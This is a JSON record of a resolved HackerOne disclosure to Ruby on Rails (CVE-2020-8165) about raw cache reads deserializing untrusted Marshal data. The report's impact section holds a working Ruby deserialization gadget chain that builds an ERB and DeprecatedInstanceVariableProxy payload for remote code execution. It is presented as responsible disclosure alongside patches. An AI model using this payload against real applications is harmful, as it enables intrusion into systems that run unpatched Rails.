@@ -1,0 +1,140 @@
+{
+  "id": 413388,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80MTMzODg=",
+  "url": "https://hackerone.com/reports/413388",
+  "title": "Untrusted strings that are cache fetched with raw option are automatically marshal loaded",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2018-09-24T12:58:49.441Z",
+  "submitted_at": "2018-09-24T12:58:49.441Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "dylan-ts",
+    "url": "/dylan-ts",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 22,
+    "url": "https://hackerone.com/rails",
+    "handle": "rails",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Ruby on Rails",
+      "twitter_handle": "rails",
+      "website": "http://rubyonrails.org/security",
+      "about": "Web development that doesn't hurt."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2020-8165"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2020-05-26T22:38:29.197Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2020-05-18T19:39:18.817Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "This vulnerability effects application code that caches a string from an untrusted source using the `raw: true` option. For example, vulnerable application code might looks something like the following\n\n```ruby\nbody = Rails.cache.fetch(key, raw: true, expires_in: ttl) do\n  res = Net::HTTP.get_response(remote_uri)\n  res.value # raise on HTTP error\n  res.body\nend\n```\n\nwhere `res.body` represents the untrusted string in the example above.  The below script shows that an untrusted string in the Marshal format will be deserialized when read using `raw: true`.\n\n```ruby\nrequire 'rails/all'\n\nuntrusted_string = Marshal.dump(:sym)\n\ncache = ActiveSupport::Cache::MemCacheStore.new('localhost')\ncache.delete(\"demo\")\ndata = cache.fetch(\"demo\", raw: true) { untrusted_string }\np data # \"\\x04\\b:\\bsym\"\ndata = cache.fetch(\"demo\", raw: true)\np data # :sym\n```\n\nThis vulnerability appears to have been around for a long time, so would affect all currently supported versions of rails. I've tested with the earliest and latest supported rails version, 4.2.10 and 5.2.1 and both are affected.\n\nThe vulnerability affects both MemCacheStore and RedisCacheStore cache backends that are a part of rails, but cache stores developed outside of rails could also be vulnerable. For instance, the memcached_store has the same vulnerability as a result of replicating the behaviour of MemCacheStore.\n\nI've attached patches to fix MemCacheStore and RedisCacheStore on master.  I believe the MemCacheStore patch can be backported, since Dalli uses memcached's flags to tag keys that need marshal loading (since [Dalli version 0.11.0](https://github.com/petergoldstein/dalli/blob/master/History.md#0110)) so can avoid unmarshalling raw strings.  However, backporting RedisCacheStore could cause backwards compatibility problems with application code that writes and reads a cache key with a different raw option value, so I've included a patch to deprecate that usage in rails 5.2.\n\n## Impact\n\nAs has been demonstrated in the past, Marshal.load of an untrusted string can lead to remote code execution when done in rails without any reliance on application code.\n\nThe following script demonstrates that this is still the case and shows that a generic exploit payload can be used.\n\n```ruby\nrequire 'erb'\nrequire 'rails/all'\n\nremote_code = <<-RUBY\nputs 'HACKED'\nRUBY\n\nerb = ERB.allocate\nerb.instance_variable_set(:@src, remote_code)\nerb.instance_variable_set(:@lineno, 0)\ndeprecation = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result)\nexploit_data = Marshal.dump(deprecation)\n\nobj = Marshal.load(exploit_data)\nobj.is_a?(ActiveSupport::Cache::Entry)\n```\n\nSo a generic exploit payload could be provided to applications to try to find if the application stores and fetches raw strings from the cache.",
+  "weakness": {
+    "id": 52,
+    "name": "Deserialization of Untrusted Data"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 350331,
+      "file_name": "0001-master-MemCacheStore-patch.diff.txt",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/350/331/ac9cf46191a04dc4ebe5c54d86992aab86b8000f/0001-master-MemCacheStore-patch.diff.txt?response-content-disposition=attachment%3B%20filename%3D%220001-master-MemCacheStore-patch.diff.txt%22%3B%20filename%2A%3DUTF-8%27%270001-master-MemCacheStore-patch.diff.txt&response-content-type=text%2Fx-diff&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQXSC2BV6P%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T103016Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEIf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDBIYb02bdmQriBWFQCEt2NO%2BhKeraB1Qpp81%2FB0i9PpAIgHE%2BQf3yAo0CZ%2FZ3u4XKtRCYh4rXLiTb1MJbcg0gdWxAqsgUIEBADGgwwMTM2MTkyNzQ4NDkiDCXH8kDWzUxqHWFGdSqPBTU8%2FsCyCfLOsQWZ0n8Vwyc49u2ZrgqAwWPscpryNaiw1d89b1p6tHxiVdX6ZHTu55X%2FmXPMu3l2kl9iEv3sv6fR5NB3AS2601G1Aufr23nWvSUWxu193vVfMoRmlrE%2BwNiG%2FX5RQWLr8xCt43VvqxD1VwBJ1%2FRn3f7YRpNEyFPcpVD%2FZSbzgRJ7ycQykB9d3KUkHYh%2FgnnBxcIyBMa2WQuglu%2BPQdV3k%2FWawLxCd1jZqacsxjIsp%2FgVzSoYMdLXDtKdM3ANmASZNZjoaaX4r5M%2BpkUvnhhqFy%2FDPBxmmKDto9anAWsN781BmRlDy5RZO9eZNMWGIYRVcvSk75POfwWIHN0RXGfWg31SHJyzDAZSZOM3Kagl3mkYvmR1mlxl%2F7Wxdxkr9gMjbvH%2FvUmYIl%2FMuIe9UTIVtEXJof3GHP8ozEi4QYwBwGxBI%2F9UeeUT7KthQIbNkpzeImvDRLpkiJTvIku0EClCKE3HomU65erQsoEPwp0Z%2B1KDSdn2y6%2F8B3f12AmMNytEdVTsfpYsJwHpa5ldrCOtv56n6YyUIOMlSmauNd3YAXISEUDWEAvR%2BitCjK02JztBXQAx6E%2FVSAOEfGRUhUUvTfG4MNJfiZFtS3EkZMHtNXOPxH%2BKHwRZLJBIemfk3GNle%2B6ve8CA0v%2BmBSZufZn0bhOSZJSj8JEFXx%2BSVrX9sLN6LL1zsxTwhsCgIBz1t1VTb5%2FYmnsFKEonTNk2L6nSGyKh0E6OxW0Gpv6LXQI%2BbOulfsaMevlpPCK0x3UzZZVhkt9uKAc6sSTYU3ZYxCaT96B1x8AU9cVFetiUS%2FS%2BpJ7KFcDdmg7NxmmR82rqk%2F95Q11hkdNrcvflKU1naXYYR3RaGVQOPn4wsLi%2BxgY6sQHcA8FyNn5BdDkdxWC6Pvkk0Ms0ZxKd%2BmExljJyCpvOJX4hl7PqcQMC6ZWa7lwCx7N3rC19UTcW8KZ7tiezB5sRqVb7a4ttSTZVJLtpt2HKYTnln5CyIMIQ%2BDW6W84g2neFcrtV5IAZBqjMUCtNRur2Gxi9ge8uKY4ZZBVtf47zz%2Fjw55UfZHZofZPDiKeq8Af8oShnRDlX93IqEBMsD5epUFmbTEBefGgEfdSr%2FXAJKio%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=0fb31967c4bf5961739184be2555bbef754590baab56e14e5436e88afabbb2db",
+      "file_size": 2925,
+      "type": "text/x-diff",
+      "moderated": null
+    },
+    {
+      "id": 350332,
+      "file_name": "0002-master-RedisCacheStore-patch.diff.txt",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/350/332/6bf7e8616da7dab83f8e3764c8f6b665600b814b/0002-master-RedisCacheStore-patch.diff.txt?response-content-disposition=attachment%3B%20filename%3D%220002-master-RedisCacheStore-patch.diff.txt%22%3B%20filename%2A%3DUTF-8%27%270002-master-RedisCacheStore-patch.diff.txt&response-content-type=text%2Fx-diff&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQXSC2BV6P%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T103016Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEIf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDBIYb02bdmQriBWFQCEt2NO%2BhKeraB1Qpp81%2FB0i9PpAIgHE%2BQf3yAo0CZ%2FZ3u4XKtRCYh4rXLiTb1MJbcg0gdWxAqsgUIEBADGgwwMTM2MTkyNzQ4NDkiDCXH8kDWzUxqHWFGdSqPBTU8%2FsCyCfLOsQWZ0n8Vwyc49u2ZrgqAwWPscpryNaiw1d89b1p6tHxiVdX6ZHTu55X%2FmXPMu3l2kl9iEv3sv6fR5NB3AS2601G1Aufr23nWvSUWxu193vVfMoRmlrE%2BwNiG%2FX5RQWLr8xCt43VvqxD1VwBJ1%2FRn3f7YRpNEyFPcpVD%2FZSbzgRJ7ycQykB9d3KUkHYh%2FgnnBxcIyBMa2WQuglu%2BPQdV3k%2FWawLxCd1jZqacsxjIsp%2FgVzSoYMdLXDtKdM3ANmASZNZjoaaX4r5M%2BpkUvnhhqFy%2FDPBxmmKDto9anAWsN781BmRlDy5RZO9eZNMWGIYRVcvSk75POfwWIHN0RXGfWg31SHJyzDAZSZOM3Kagl3mkYvmR1mlxl%2F7Wxdxkr9gMjbvH%2FvUmYIl%2FMuIe9UTIVtEXJof3GHP8ozEi4QYwBwGxBI%2F9UeeUT7KthQIbNkpzeImvDRLpkiJTvIku0EClCKE3HomU65erQsoEPwp0Z%2B1KDSdn2y6%2F8B3f12AmMNytEdVTsfpYsJwHpa5ldrCOtv56n6YyUIOMlSmauNd3YAXISEUDWEAvR%2BitCjK02JztBXQAx6E%2FVSAOEfGRUhUUvTfG4MNJfiZFtS3EkZMHtNXOPxH%2BKHwRZLJBIemfk3GNle%2B6ve8CA0v%2BmBSZufZn0bhOSZJSj8JEFXx%2BSVrX9sLN6LL1zsxTwhsCgIBz1t1VTb5%2FYmnsFKEonTNk2L6nSGyKh0E6OxW0Gpv6LXQI%2BbOulfsaMevlpPCK0x3UzZZVhkt9uKAc6sSTYU3ZYxCaT96B1x8AU9cVFetiUS%2FS%2BpJ7KFcDdmg7NxmmR82rqk%2F95Q11hkdNrcvflKU1naXYYR3RaGVQOPn4wsLi%2BxgY6sQHcA8FyNn5BdDkdxWC6Pvkk0Ms0ZxKd%2BmExljJyCpvOJX4hl7PqcQMC6ZWa7lwCx7N3rC19UTcW8KZ7tiezB5sRqVb7a4ttSTZVJLtpt2HKYTnln5CyIMIQ%2BDW6W84g2neFcrtV5IAZBqjMUCtNRur2Gxi9ge8uKY4ZZBVtf47zz%2Fjw55UfZHZofZPDiKeq8Af8oShnRDlX93IqEBMsD5epUFmbTEBefGgEfdSr%2FXAJKio%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=afc026d57281a36a8c9fb0fb7136cb248d41cf44ce87ca6fb199617a560428ca",
+      "file_size": 9500,
+      "type": "text/x-diff",
+      "moderated": null
+    },
+    {
+      "id": 350333,
+      "file_name": "0002-rails-5.2-deprecate-marshal-load-on-raw-cache-values.diff.txt",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/350/333/76fce18b3ef346018d9d3741468987d9121e8a2a/0002-rails-5.2-deprecate-marshal-load-on-raw-cache-values.diff.txt?response-content-disposition=attachment%3B%20filename%3D%220002-rails-5.2-deprecate-marshal-load-on-raw-cache-values.diff.txt%22%3B%20filename%2A%3DUTF-8%27%270002-rails-5.2-deprecate-marshal-load-on-raw-cache-values.diff.txt&response-content-type=text%2Fx-diff&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQXSC2BV6P%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T103016Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEIf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDBIYb02bdmQriBWFQCEt2NO%2BhKeraB1Qpp81%2FB0i9PpAIgHE%2BQf3yAo0CZ%2FZ3u4XKtRCYh4rXLiTb1MJbcg0gdWxAqsgUIEBADGgwwMTM2MTkyNzQ4NDkiDCXH8kDWzUxqHWFGdSqPBTU8%2FsCyCfLOsQWZ0n8Vwyc49u2ZrgqAwWPscpryNaiw1d89b1p6tHxiVdX6ZHTu55X%2FmXPMu3l2kl9iEv3sv6fR5NB3AS2601G1Aufr23nWvSUWxu193vVfMoRmlrE%2BwNiG%2FX5RQWLr8xCt43VvqxD1VwBJ1%2FRn3f7YRpNEyFPcpVD%2FZSbzgRJ7ycQykB9d3KUkHYh%2FgnnBxcIyBMa2WQuglu%2BPQdV3k%2FWawLxCd1jZqacsxjIsp%2FgVzSoYMdLXDtKdM3ANmASZNZjoaaX4r5M%2BpkUvnhhqFy%2FDPBxmmKDto9anAWsN781BmRlDy5RZO9eZNMWGIYRVcvSk75POfwWIHN0RXGfWg31SHJyzDAZSZOM3Kagl3mkYvmR1mlxl%2F7Wxdxkr9gMjbvH%2FvUmYIl%2FMuIe9UTIVtEXJof3GHP8ozEi4QYwBwGxBI%2F9UeeUT7KthQIbNkpzeImvDRLpkiJTvIku0EClCKE3HomU65erQsoEPwp0Z%2B1KDSdn2y6%2F8B3f12AmMNytEdVTsfpYsJwHpa5ldrCOtv56n6YyUIOMlSmauNd3YAXISEUDWEAvR%2BitCjK02JztBXQAx6E%2FVSAOEfGRUhUUvTfG4MNJfiZFtS3EkZMHtNXOPxH%2BKHwRZLJBIemfk3GNle%2B6ve8CA0v%2BmBSZufZn0bhOSZJSj8JEFXx%2BSVrX9sLN6LL1zsxTwhsCgIBz1t1VTb5%2FYmnsFKEonTNk2L6nSGyKh0E6OxW0Gpv6LXQI%2BbOulfsaMevlpPCK0x3UzZZVhkt9uKAc6sSTYU3ZYxCaT96B1x8AU9cVFetiUS%2FS%2BpJ7KFcDdmg7NxmmR82rqk%2F95Q11hkdNrcvflKU1naXYYR3RaGVQOPn4wsLi%2BxgY6sQHcA8FyNn5BdDkdxWC6Pvkk0Ms0ZxKd%2BmExljJyCpvOJX4hl7PqcQMC6ZWa7lwCx7N3rC19UTcW8KZ7tiezB5sRqVb7a4ttSTZVJLtpt2HKYTnln5CyIMIQ%2BDW6W84g2neFcrtV5IAZBqjMUCtNRur2Gxi9ge8uKY4ZZBVtf47zz%2Fjw55UfZHZofZPDiKeq8Af8oShnRDlX93IqEBMsD5epUFmbTEBefGgEfdSr%2FXAJKio%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=a17c612be821d5d98366f954920fa9c92664aeb6e905da1b0152130520cb1632",
+      "file_size": 9846,
+      "type": "text/x-diff",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2020-06-17T19:39:18.953Z",
+  "allow_singular_disclosure_after": -166027857.11655274,
+  "singular_disclosure_allowed": true,
+  "vote_count": 2,
+  "voters": [
+    "pyscr1pt3r",
+    "noraj"
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 160,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/rails/rails",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
